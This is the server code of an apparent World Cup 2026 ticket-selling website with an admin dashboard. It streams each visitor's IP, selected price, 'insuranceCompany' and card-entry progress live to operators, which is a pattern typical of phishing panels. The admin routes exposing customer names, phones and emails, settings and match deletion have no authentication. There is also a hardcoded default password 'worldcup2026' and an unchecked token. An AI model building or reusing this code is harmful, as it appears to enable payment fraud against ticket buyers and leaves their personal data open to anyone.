const express = require('express');
const sqlite3 = require('sqlite3').verbose();
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

const db = new sqlite3.Database('./database.db', (err) => {
    if (err) console.error(err.message);
    else console.log('Connected to database');
});

// ==========================================
// REAL-TIME VISITOR TRACKING SYSTEM
// ==========================================

// In-memory store for active users
const activeUsers = {};
const sseClients = [];

// Heartbeat timeout (30 seconds)
const HEARTBEAT_TIMEOUT = 30000;

// Clean up inactive users periodically
setInterval(() => {
    const now = Date.now();
    Object.keys(activeUsers).forEach(sessionId => {
        if (now - activeUsers[sessionId].lastSeen > HEARTBEAT_TIMEOUT) {
            delete activeUsers[sessionId];
        }
    });
    // Broadcast updated list to all SSE clients
    broadcastUpdate();
}, 10000);

// Broadcast updates to all SSE clients
function broadcastUpdate() {
    const data = JSON.stringify(Array.from(Object.entries(activeUsers)).map(([id, user]) => ({
        sessionId: id,
        ...user
    })));
    sseClients.forEach(client => {
        try {
            client.write(`data: ${data}\n\n`);
        } catch (e) {
            // Client disconnected
        }
    });
}

// SSE Endpoint for Admin Dashboard
app.get('/api/admin/visitor-stream', (req, res) => {
    res.setHeader('Content-Type', 'text/event-stream');
    res.setHeader('Cache-Control', 'no-cache');
    res.setHeader('Connection', 'keep-alive');
    res.setHeader('Access-Control-Allow-Origin', '*');
    
    // Send initial data
    const initialData = JSON.stringify(Array.from(Object.entries(activeUsers)).map(([id, user]) => ({
        sessionId: id,
        ...user
    })));
    res.write(`data: ${initialData}\n\n`);
    
    // Add to clients list
    sseClients.push(res);
    
    // Keep connection alive
    const keepAlive = setInterval(() => {
        res.write(': keepalive\n\n');
    }, 20000);
    
    req.on('close', () => {
        clearInterval(keepAlive);
        const index = sseClients.indexOf(res);
        if (index > -1) sseClients.splice(index, 1);
    });
});

// Visitor tracking endpoint (called by client pages)
app.post('/api/track-activity', (req, res) => {
    try {
        const { sessionId, page, selectedPrice, selectedTier, country, insuranceCompany, cardProgress } = req.body;
        
        if (!sessionId) {
            res.status(400).json({ error: 'sessionId required' });
            return;
        }
        
        const userAgent = req.headers['user-agent'] || 'Unknown';
        const ip = req.ip || req.connection.remoteAddress || 'Unknown';
        
        activeUsers[sessionId] = {
            page: page || 'unknown',
            selectedPrice: selectedPrice || null,
            selectedTier: selectedTier || null,
            country: country || null,
            insuranceCompany: insuranceCompany || null,
            cardProgress: cardProgress || null,
            lastSeen: Date.now(),
            userAgent: userAgent,
            ip: ip
        };
        
        // Broadcast immediately to all SSE clients
        broadcastUpdate();
        
        // Use res.send to avoid middleware issues
        res.type('json').send(JSON.stringify({ success: true, activeCount: Object.keys(activeUsers).length }));
    } catch (error) {
        console.error('Track activity error:', error);
        res.status(500).json({ error: 'Internal error' });
    }
});

// Analytics summary endpoint
app.get('/api/admin/analytics-summary', (req, res) => {
    const summary = {
        totalActive: Object.keys(activeUsers).length,
        byPage: {},
        byCountry: {},
        byTier: {},
        recentActivity: []
    };
    
    // Group by page
    Object.values(activeUsers).forEach(user => {
        const page = user.page || 'unknown';
        summary.byPage[page] = (summary.byPage[page] || 0) + 1;
        
        // Group by country
        if (user.country) {
            summary.byCountry[user.country] = (summary.byCountry[user.country] || 0) + 1;
        }
        
        // Group by tier
        if (user.selectedTier) {
            summary.byTier[user.selectedTier] = (summary.byTier[user.selectedTier] || 0) + 1;
        }
    });
    
    // Recent activity (last 10)
    const entries = Object.entries(activeUsers)
        .sort((a, b) => b[1].lastSeen - a[1].lastSeen)
        .slice(0, 10);
    
    summary.recentActivity = entries.map(([id, user]) => ({
        sessionId: id,
        ...user
    }));
    
    res.json(summary);
});

// Clear analytics endpoint
app.delete('/api/admin/clear-analytics', (req, res) => {
    const count = Object.keys(activeUsers).length;
    Object.keys(activeUsers).forEach(key => delete activeUsers[key]);
    
    // Also clear database visitors table if needed
    db.run('DELETE FROM visitors', [], (err) => {
        if (err) console.error('Error clearing visitors:', err.message);
    });
    
    res.json({ success: true, clearedCount: count });
});

// Get all active users (for initial load)
app.get('/api/admin/active-users', (req, res) => {
    const users = Array.from(Object.entries(activeUsers)).map(([id, user]) => ({
        sessionId: id,
        ...user
    }));
    res.json(users);
});

// ==========================================
// END VISITOR TRACKING SYSTEM
// ==========================================

// Clean corrupted flag data on startup
db.serialize(() => {
    db.all("SELECT id, home_team_flag, away_team_flag FROM matches", [], (err, rows) => {
        if (err) console.error('Error checking flags:', err.message);
        else if (rows.length > 0) {
            let corruptedCount = 0;
            rows.forEach(row => {
                const cleanHome = extractCleanUrl(row.home_team_flag);
                const cleanAway = extractCleanUrl(row.away_team_flag);
                // Only update if we found a clean URL and it's different from the current value
                if ((cleanHome && cleanHome !== row.home_team_flag) || (cleanAway && cleanAway !== row.away_team_flag)) {
                    corruptedCount++;
                    db.run('UPDATE matches SET home_team_flag = ?, away_team_flag = ? WHERE id = ?', 
                        [cleanHome || row.home_team_flag, cleanAway || row.away_team_flag, row.id], (err) => {
                            if (err) console.error('Error cleaning flag:', err.message);
                        });
                }
            });
            if (corruptedCount > 0) {
                console.log(`Cleaned ${corruptedCount} matches with corrupted flags`);
            }
        }
    });
});

// Helper to extract clean URL from corrupted flag data
function extractCleanUrl(flagUrl) {
    if (!flagUrl) return '';
    // Handle HTML img tags like <img src="https://flagcdn.com/w80/mx.png" ...>
    const imgMatch = String(flagUrl).match(/src=["']([^"']*flagcdn[^"']+\.(png|jpg|svg)[^"']*)["']/i);
    if (imgMatch) return imgMatch[1];
    // Handle raw URLs
    const urlMatch = String(flagUrl).match(/https:\/\/flagcdn\.com\/[^\s"'>]+\.(png|jpg|svg)/);
    if (urlMatch) return urlMatch[0];
    // Check if it's already a clean URL
    if (/^https:\/\/flagcdn\.com\/[^\s"'>]+\.(png|jpg|svg)$/.test(flagUrl)) return flagUrl;
    return '';
}

// Flag sanitization for match endpoints only
app.use('/api/matches', (req, res, next) => {
    const originalJson = res.json.bind(res);
    res.json = function(data) {
        if (data && typeof data === 'object' && !Array.isArray(data) && (data.home_team_flag !== undefined || data.away_team_flag !== undefined)) {
            data = { ...data };
            data.home_team_flag = extractCleanUrl(data.home_team_flag);
            data.away_team_flag = extractCleanUrl(data.away_team_flag);
        }
        return originalJson(data);
    };
    next();
});

app.use(express.static('public'));
app.use(express.json());

// Sitemap
app.get('/sitemap.xml', (req, res) => {
    res.type('application/xml');
    db.all('SELECT id, match_date FROM matches ORDER BY id', [], (err, rows) => {
        if (err) rows = [];
        let sitemap = `<?xml version="1.0" encoding="UTF-8"?>
<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">
    <url><loc>https://newcup.onrender.com/</loc><lastmod>2026-05-31</lastmod><changefreq>daily</changefreq><priority>1.0</priority></url>
    <url><loc>https://newcup.onrender.com/?view=matches</loc><lastmod>2026-05-31</lastmod><changefreq>daily</changefreq><priority>0.9</priority></url>`;
        rows.forEach(match => {
            sitemap += `\n    <url><loc>https://newcup.onrender.com/?view=match&id=${match.id}</loc><lastmod>${match.match_date ? match.match_date.split('T')[0] : '2026-05-31'}</lastmod><changefreq>weekly</changefreq><priority>0.8</priority></url>`;
        });
        sitemap += '\n</urlset>';
        res.send(sitemap);
    });
});

// Robots
app.get('/robots.txt', (req, res) => {
    res.type('text/plain');
    res.send('User-agent: *\nAllow: /\nDisallow: /admin\n');
});

// Matches
app.get('/api/matches', (req, res) => {
    db.all('SELECT * FROM matches ORDER BY match_date', [], (err, rows) => {
        if (err) return res.status(500).json({ error: err.message });
        res.json(rows);
    });
});

app.get('/api/matches/:id', (req, res) => {
    db.get('SELECT * FROM matches WHERE id = ?', [req.params.id], (err, row) => {
        if (err) return res.status(500).json({ error: err.message });
        if (!row) return res.status(404).json({ error: 'Match not found' });
        res.json(row);
    });
});

// Seats
app.get('/api/matches/:id/seats', (req, res) => {
    db.all('SELECT section, row, seat_number, category, price, status FROM tickets WHERE match_id = ?', [req.params.id], (err, rows) => {
        if (err) return res.status(500).json({ error: err.message });
        const seats = {};
        rows.forEach(ticket => {
            const key = `${ticket.section}-${ticket.row}-${ticket.seat_number}`;
            seats[key] = { section: ticket.section, row: ticket.row, seat: ticket.seat_number, category: ticket.category, price: ticket.price, status: ticket.status };
        });
        res.json(seats);
    });
});

// Tickets (alias)
app.get('/api/matches/:id/tickets', (req, res) => {
    db.all('SELECT section, row, seat_number, category, price, status FROM tickets WHERE match_id = ?', [req.params.id], (err, rows) => {
        if (err) return res.status(500).json({ error: err.message });
        const tickets = {};
        rows.forEach(ticket => {
            const key = `${ticket.section}-${ticket.row}-${ticket.seat_number}`;
            tickets[key] = { section: ticket.section, row: ticket.row, seat: ticket.seat_number, category: ticket.category, price: ticket.price, status: ticket.status };
        });
        res.json(tickets);
    });
});

// Featured matches
app.get('/api/stats/featured-matches', (req, res) => {
    db.all('SELECT * FROM matches ORDER BY match_date LIMIT 4', [], (err, rows) => {
        if (err) return res.status(500).json({ error: err.message });
        res.json(rows);
    });
});

// Stats summary for dashboard
app.get('/api/stats/summary', (req, res) => {
    const stats = { totalMatches: 0, totalOrders: 0, totalRevenue: 0, availableTickets: 0 };
    
    db.get('SELECT COUNT(*) as count FROM matches', [], (err, row) => {
        if (err) return res.status(500).json({ error: err.message });
        stats.totalMatches = row.count;
        
        db.get('SELECT COUNT(*) as count, COALESCE(SUM(total_price), 0) as revenue FROM orders', [], (err, row) => {
            if (err) return res.status(500).json({ error: err.message });
            stats.totalOrders = row.count;
            stats.totalRevenue = row.revenue;
            
            db.get('SELECT COUNT(*) as count FROM tickets WHERE status = "available"', [], (err, row) => {
                if (err) return res.status(500).json({ error: err.message });
                stats.availableTickets = row.count;
                res.json(stats);
            });
        });
    });
});

// Orders - POST
app.post('/api/orders', (req, res) => {
    console.log('Orders request:', req.body);
    
    const customerName = req.body.customerName || '';
    const phone = req.body.phone || '';
    const email = req.body.email || '';
    const country = req.body.country || '';
    const matchId = req.body.matchId;
    const selectedSeats = String(req.body.selectedSeats || '');
    const totalPrice = req.body.totalPrice || 0;

    if (!customerName || !phone) {
        return res.status(400).json({ error: 'Name and phone are required' });
    }

    db.run(`INSERT INTO orders (customer_name, phone, email, country, match_id, selected_seats, total_price, payment_status)
            VALUES (?, ?, ?, ?, ?, ?, ?, 'pending')`,
        [customerName, phone, email, country, matchId, selectedSeats, totalPrice],
        function(err) {
            if (err) {
                console.error('DB Error:', err);
                return res.status(500).json({ error: err.message });
            }
            res.json({ success: true, orderId: this.lastID });
        });
});

// Orders - GET (admin)
app.get('/api/orders', (req, res) => {
    db.all('SELECT * FROM orders ORDER BY created_at DESC LIMIT 100', [], (err, rows) => {
        if (err) return res.status(500).json({ error: err.message });
        res.json(rows);
    });
});

// Admin login
const ADMIN_USERNAME = process.env.ADMIN_USERNAME || 'admin';
const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || 'worldcup2026';

app.post('/api/admin/login', (req, res) => {
    const { username, password } = req.body;
    if (username === ADMIN_USERNAME && password === ADMIN_PASSWORD) {
        res.json({ success: true, token: 'admin-token-' + Date.now() });
    } else {
        res.status(401).json({ error: 'Invalid credentials' });
    }
});

// Visitors
app.post('/api/visitors', (req, res) => {
    const { sessionId, matchId } = req.body;
    db.run(`INSERT OR REPLACE INTO visitors (session_id, match_id, visited_at) VALUES (?, ?, datetime('now'))`,
        [sessionId, matchId || null],
        function(err) {
            if (err) return res.status(500).json({ error: err.message });
            res.json({ success: true });
        });
});

app.get('/api/visitors', (req, res) => {
    db.all(`
        SELECT v.*, m.home_team || ' vs ' || m.away_team as match_name 
        FROM visitors v 
        LEFT JOIN matches m ON v.match_id = m.id 
        ORDER BY v.visited_at DESC
    `, [], (err, rows) => {
        if (err) return res.status(500).json({ error: err.message });
        res.json(rows);
    });
});

// Settings
app.get('/api/settings', (req, res) => {
    db.all('SELECT key, value FROM settings', [], (err, rows) => {
        if (err) return res.status(500).json({ error: err.message });
        const settings = {};
        rows.forEach(row => { settings[row.key] = row.value; });
        res.json(settings);
    });
});

app.put('/api/settings/:key', (req, res) => {
    const { key } = req.params;
    const { value } = req.body;
    if (!value) return res.status(400).json({ error: 'Value is required' });
    
    db.run('INSERT OR REPLACE INTO settings (key, value, updated_at) VALUES (?, ?, datetime("now"))', [key, value], function(err) {
        if (err) return res.status(500).json({ error: err.message });
        res.json({ success: true });
    });
});

// Stadiums
app.get('/api/stadiums', (req, res) => {
    db.all('SELECT DISTINCT stadium, stadium_ar, city FROM matches ORDER BY stadium', [], (err, rows) => {
        if (err) return res.status(500).json({ error: err.message });
        res.json(rows);
    });
});

// SPA fallback
app.get('*', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});

// Update match (PUT)
app.put('/api/matches/:id', (req, res) => {
    const { id } = req.params;
    const fields = [];
    const values = [];
    
    const allowedFields = ['home_team', 'home_team_ar', 'home_team_flag', 'away_team', 'away_team_ar', 'away_team_flag', 'match_date', 'stadium', 'stadium_ar', 'city', 'city_ar', 'stage', 'stage_ar', 'sort_order', 'min_price', 'is_active'];
    
    for (const field of allowedFields) {
        if (req.body[field] !== undefined) {
            fields.push(`${field} = ?`);
            values.push(req.body[field]);
        }
    }
    
    if (fields.length === 0) {
        return res.status(400).json({ error: 'No fields to update' });
    }
    
    values.push(id);
    db.run(`UPDATE matches SET ${fields.join(', ')} WHERE id = ?`, values, function(err) {
        if (err) return res.status(500).json({ error: err.message });
        res.json({ success: true, changes: this.changes });
    });
});

// Delete match
app.delete('/api/matches/:id', (req, res) => {
    db.run('DELETE FROM matches WHERE id = ?', [req.params.id], function(err) {
        if (err) return res.status(500).json({ error: err.message });
        res.json({ success: true, changes: this.changes });
    });
});
